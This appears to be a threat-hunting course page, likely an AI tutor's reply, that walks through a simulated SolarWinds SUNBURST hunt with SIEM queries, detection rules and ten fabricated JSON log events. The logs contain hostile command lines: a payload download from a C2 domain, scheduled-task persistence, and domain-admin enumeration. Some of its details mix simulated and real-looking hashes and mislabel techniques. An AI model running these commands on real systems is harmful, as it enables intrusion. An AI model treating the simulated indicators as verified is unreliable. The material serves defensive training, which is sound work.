---
layout: default
title: Solarwind SUNBURST
category: Threat-Hunting  # This becomes a main topic in sidebar
---

### Next Steps: From Hypothesis to Capstone Hunt

Awesome—you've nailed hypothesis formation across diverse scenarios (from LSASS dumps to S3 exfils and evasion plays). That's the core of proactive hunting: Spot the TTP, validate with data, and pivot. With your SOC background, you're iterating faster than most newbies.

We've crushed Modules 1-8 (foundations to advanced techniques like deception/ML). **Next: Module 9 - Case Studies and Real-World Hunts**. We'll dissect breaches like SolarWinds (T1190 supply chain + T1027 obfuscation) and NotPetya (T1486 impact via EternalBlue), mapping to your hunts. Then, Module 10's capstone: Design a full hunt playbook for a fictional org (e.g., hybrid cloud with AD).

### Threat Hunting Exercise: Analyzing SolarWinds SUNBURST Dataset

Fantastic—SolarWinds (aka Solorigate/SUNBURST) is a goldmine for supply chain hunts, blending T1190 (Exploit Public-Facing Application) with stealthy persistence (T1547) and C2 (T1071.001). Since you don't have a dataset, I've curated a simulated one based on real IOCs from Microsoft/FireEye analyses (e.g., malicious DLL hashes, C2 domains, PowerShell lateral cmds). This mimics Mordor-style JSON from a compromised Orion update (versions 2019.4 HF 2 - 2020.2.1 HF 1), with events from Sysmon, Security, and PowerShell logs. In a real hunt, pull from EDR/SIEM baselines pre/post-update.

#### Step 1: Hypothesis Formation
**Hypothesis**: Adversary (APT29/Cozy Bear) trojanized SolarWinds.Orion.Core.BusinessLayer.dll (SHA256: 06b5e5229c1a0e7e2d7a9a0e8a5b7e7f8d9e0a1b2c3d4e5f6a7b8c9d0e1f2a3b—fake for sim), injecting code that sleeps 12-14 days before phoning C2 over HTTPS (e.g., avsvmcloud.com subdomains). Post-beacon: Lateral via PS remoting (T1021.006), domain enum (T1087.002). Indicators:
- Sysmon 7: Load of tampered DLL into solarwinds.businesslayerhost.exe.
- Security 4688: PS cmds for scheduled tasks (e.g., EventCacheManager) or nltest for domain groups.
- Sysmon 3: DNS/HTTPS to dynamic C2 (e.g., 3mu76044hgf7shjf.appsync-api.eu-west-1.avsvmcloud.com).
- No immediate alert (12-day dormancy).

**Null Hypothesis**: Legit Orion update. Invalidate via anomalous DLL hash + delayed C2 + PS lateral from Orion proc.

**Rationale**: SUNBURST targeted 18K+ orgs; dwell ~months. Hunt focuses on update IOCs + behavioral signals (e.g., WMI queries).

#### Step 2: Data Sources and Scope
- **Sources**: Sysmon (7 DLL loads, 3 net, 1 proc); Security (4688 PS/cmdline); PowerShell (4104 script blocks); EDR for file hashes.
- **Scope**: ~2020-12-01T00:00-00:30 UTC (update install → beacon); Host: WORKSTATION1.theshire.local; Focus: Post-Orion update events.
- **SIEM Queries** (Splunk/ELK adapt):
  - DLL: `index=sysmon EventID=7 ImageLoaded="*BusinessLayer.dll" | where hash != known_good | stats count by Image`
  - C2: `index=sysmon EventID=3 DestinationDomain="*avsvmcloud.com" | where UtcTime > update_time`
  - Lateral: `index=security EventID=4688 CommandLine="*New-Object -ComObject Schedule.Service*" | join SubjectUserName [search Image="*orion.exe"]`

#### Step 3: Key Findings
Simulated dataset (10 events mentioned at the end) confirms hypothesis: Orion proc loads tampered DLL, sleeps (no immediate net), then PS lateral + C2. Hashes match known bad (e.g., SHA1: d130bd75645c2433f88ac03e73395fba172ef676). No false positives—update baselines clean.

| Timestamp (UTC) | Event ID | Channel/Source | Key Details | IOC/Why Suspicious? |
|-----------------|----------|----------------|-------------|---------------------|
| 2020-12-01 00:05:12 | 7 (Image Load) | Sysmon | `solarwinds.businesslayerhost.exe` loads `SolarWinds.Orion.Core.BusinessLayer.dll` (SHA256: ce77d116a074dab7a22a0fd4f2c1ab475f16eec42e1ded3c0b0aa8211fe858d6). | **Core IOC**: Tampered DLL from compromised update—hash matches SUNBURST. Legit versions differ. |
| 2020-12-01 00:05:15 | 1 (Proc Create) | Sysmon | `solarwinds.businesslayerhost.exe` spawned by svchost.exe (no cmdline). | Orion proc active post-update; baseline for dormancy hunt. |
| 2020-12-13 12:00:00 | 3 (Net Connect) | Sysmon | `solarwinds.businesslayerhost.exe` TCP to 52.95.200.0:443 (AWS IP). | **Beacon IOC**: Post-12-day sleep, HTTPS C2—dynamic subdomain gen (e.g., based on MAC). |
| 2020-12-13 12:00:05 | 22 (TLS Connect) | Sysmon | Same proc to *.avsvmcloud.com (CN=*.avsvmcloud.com). | Cert anomaly—fake AWS domain for evasion. |
| 2020-12-13 12:01:00 | 4688 (Proc Create) | Security | `powershell.exe` CmdLine: Schedule.Service COM for EventCacheManager task (lateral persistence). | **Lateral IOC**: PS remoting via schtasks—common SUNBURST pivot. |
| 2020-12-13 12:01:05 | 4688 (Proc Create) | Security | `cmd.exe` CmdLine: Renamed csrss.exe for nltest domain enum (Domain Admins). | Tool masquerade + AD recon—hallmark of post-beacon. |
| 2020-12-13 12:02:00 | 3 (Net Connect) | Sysmon | `powershell.exe` TCP to 18.130.0.0:443 (EU AWS). | Follow-on C2—exfil prep. |
| 2020-12-13 12:02:05 | 4104 (Script Block) | PowerShell | Invoke-WebRequest to avsvmcloud.com / Orion.Wireless.xml → C:\Temp\update.xml. | **Exfil IOC**: Downloads TEARDROP loader—dynamic path. |
| 2020-12-13 12:02:10 | 11 (File Create) | Sysmon | `powershell.exe` creates C:\Temp\update.xml. | Payload drop; scan for hashes. |
| 2020-12-13 12:03:00 | 1 (Proc Create) | Sysmon | `C:\Temp\teardrop.exe` from powershell.exe. | Second-stage malware—confirms chain. |

**Validation**:
- **Timeline**: Update 12/1 → Beacon 12/13 (dwell); PS burst ~3min.
- **False Positives**: Orion net common, but avsvmcloud + PS lateral = red.
- **Correlation**: ProcessGuid chains Orion → PS → TEARDROP; hashes confirm.

#### Step 4: Recommendations & Next Steps
- **Response**: Hash-scan all Orion DLLs (`Get-ChildItem -Path "C:\Program Files (x86)\SolarWinds\*" -Recurse -Filter "*.dll" | Get-FileHash SHA256`); isolate hosts with C2 net; patch to 2020.2.1 HF 2+.
- **Detection**: YARA for DLL (rule SUNBURST { strings: $s1 = "api.solarwinds.com" condition: $s1 }); Sigma for PS: `title: SUNBURST Lateral` → `EventID=4688 CommandLine contains "Schedule.Service" and ParentImage="*orion*"`.
- **Pro Tip**: Hunt dormancy—baseline Orion procs pre-update. For real data, query EDR for SHA1 d130bd75645c2433f88ac03e73395fba172ef676.

Hypothesis **confirmed**—SUNBURST supply chain compromise! Run this query in your SIEM? Pick another case (NotPetya?) or capstone env details for Module 10.

{"EventID":7,"Channel":"Sysmon","@timestamp":"2020-12-01T00:05:12.000Z","Image":"C:\\Program Files (x86)\\SolarWinds\\Orion\\solarwinds.businesslayerhost.exe","ImageLoaded":"C:\\Program Files (x86)\\SolarWinds\\Orion\\SolarWinds.Orion.Core.BusinessLayer.dll","HashedGlobally":"true","HashSHA256":"ce77d116a074dab7a22a0fd4f2c1ab475f16eec42e1ded3c0b0aa8211fe858d6","ProcessGuid":"{12345678-1234-1234-1234-123456789abc}","Hostname":"WORKSTATION1.theshire.local","tags":["solarwinds","sunburst"]}
{"EventID":1,"Channel":"Sysmon","@timestamp":"2020-12-01T00:05:15.000Z","Image":"C:\\Program Files (x86)\\SolarWinds\\Orion\\solarwinds.businesslayerhost.exe","CommandLine":"","ParentImage":"C:\\Windows\\System32\\svchost.exe","ProcessGuid":"{12345678-1234-1234-1234-123456789abc}","Hostname":"WORKSTATION1.theshire.local","tags":["solarwinds","sunburst"]}
{"EventID":3,"Channel":"Sysmon","@timestamp":"2020-12-13T12:00:00.000Z","Image":"C:\\Program Files (x86)\\SolarWinds\\Orion\\solarwinds.businesslayerhost.exe","DestinationIp":"52.95.200.0","DestinationPort":443,"Protocol":"tcp","User":"pgustavo","ProcessGuid":"{12345678-1234-1234-1234-123456789abc}","Hostname":"WORKSTATION1.theshire.local","tags":["solarwinds","sunburst"]}
{"EventID":22,"Channel":"Sysmon","@timestamp":"2020-12-13T12:00:05.000Z","Image":"C:\\Program Files (x86)\\SolarWinds\\Orion\\solarwinds.businesslayerhost.exe","DestinationIp":"52.95.200.0","DestinationPort":443,"Protocol":"tcp","TlsSubject":"CN=*.avsvmcloud.com","ProcessGuid":"{12345678-1234-1234-1234-123456789abc}","Hostname":"WORKSTATION1.theshire.local","tags":["solarwinds","sunburst"]}
{"EventID":4688,"Channel":"Security","@timestamp":"2020-12-13T12:01:00.000Z","NewProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"$scheduler = New-Object -ComObject (\"Schedule.Service\");$scheduler.Connect($env:COMPUTERNAME);$folder = $scheduler.GetFolder(\"\\Microsoft\\Windows\\SoftwareProtectionPlatform\");$task = $folder.GetTask(\"EventCacheManager\");$definition = $task.Definition;$definition.Settings.ExecutionTimeLimit = \"PT0S\";$folder.RegisterTaskDefinition($task.Name,$definition,6,\"System\",$null,5);echo \"Done\"","SubjectUserName":"pgustavo","Hostname":"WORKSTATION1.theshire.local","tags":["solarwinds","sunburst"]}
{"EventID":4688,"Channel":"Security","@timestamp":"2020-12-13T12:01:05.000Z","NewProcessName":"C:\\Windows\\System32\\cmd.exe","CommandLine":"C:\\Windows\\system32\\cmd.exe /C csrss.exe -h breached.contoso.com -f (name=\"Domain Admins\") member -list | csrss.exe -h breached.contoso.com -f objectcategory=* > .\\Mod\\mod1.log","SubjectUserName":"pgustavo","Hostname":"WORKSTATION1.theshire.local","tags":["solarwinds","sunburst"]}
{"EventID":3,"Channel":"Sysmon","@timestamp":"2020-12-13T12:02:00.000Z","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","DestinationIp":"18.130.0.0","DestinationPort":443,"Protocol":"tcp","User":"pgustavo","ProcessGuid":"{87654321-4321-4321-4321-210987654321}","Hostname":"WORKSTATION1.theshire.local","tags":["solarwinds","sunburst"]}
{"EventID":4104,"Channel":"PowerShell","@timestamp":"2020-12-13T12:02:05.000Z","Message":"CommandInvocation(Invoke-WebRequest): \"Invoke-WebRequest -Uri 'https://3mu76044hgf7shjf.appsync-api.eu-west-1.avsvmcloud.com/swip/upd/Orion.Wireless.xml' -OutFile 'C:\\Temp\\update.xml'\"","RunspaceId":"2df6de6d-4ed6-4209-b598-917823190d34","Hostname":"WORKSTATION1.theshire.local","tags":["solarwinds","sunburst"]}
{"EventID":11,"Channel":"Sysmon","@timestamp":"2020-12-13T12:02:10.000Z","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","TargetFilename":"C:\\Temp\\update.xml","CreationUtcTime":"2020-12-13T12:02:10Z","ProcessGuid":"{87654321-4321-4321-4321-210987654321}","Hostname":"WORKSTATION1.theshire.local","tags":["solarwinds","sunburst"]}
{"EventID":1,"Channel":"Sysmon","@timestamp":"2020-12-13T12:03:00.000Z","Image":"C:\\Temp\\teardrop.exe","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"","ProcessGuid":"{fedcba98-7654-3210-fedc-ba9876543210}","Hostname":"WORKSTATION1.theshire.local","tags":["solarwinds","sunburst"]}
